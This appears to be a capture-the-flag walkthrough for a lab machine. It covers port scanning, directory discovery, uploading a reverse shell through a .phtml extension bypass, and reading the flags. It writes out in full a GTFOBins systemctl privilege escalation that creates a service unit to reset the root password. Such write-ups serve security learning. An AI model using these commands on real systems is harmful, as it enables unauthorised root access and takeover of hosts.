Steps:
1- Scan the open ports
2- Use gobuster to show the subdirectories --> find internal page
3- We can upload reveseshell on the internalpage (not accept .php files we can upload with .phtml)
4- Use gobuster to show the subdirectories from internal directory --> find uploads page
5- Run the netcat listener
6- Open the reveseshell from the uploads page on the website
7- Now we are in the machine
8- Enter the pass: /home/bill/ to find the user.txt file and get the first flag
9- find the files that can be opened by root only, command: find / -type f -perm -4000 2>/dev/null --> find some passes
10- Try to find a way to exploit the machine by this files from GTFOBins.com (we found the file that only has exploitation on GTFOBins is systemctl)
find this commands to by the root
*AF=$(mktemp).service
*echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo 'root:beboPass123!' | chpasswd"
[Install]
WantedBy=multi-user.target' > $AF
*/bin/systemctl link $AF
*/bin/systemctl enable --now $AF
11- use these commands on the machine and try to be root by using the new password --> su sudo --> Enter the password --> Now you are the root
12- Read the /root/root.txt to find the second flag
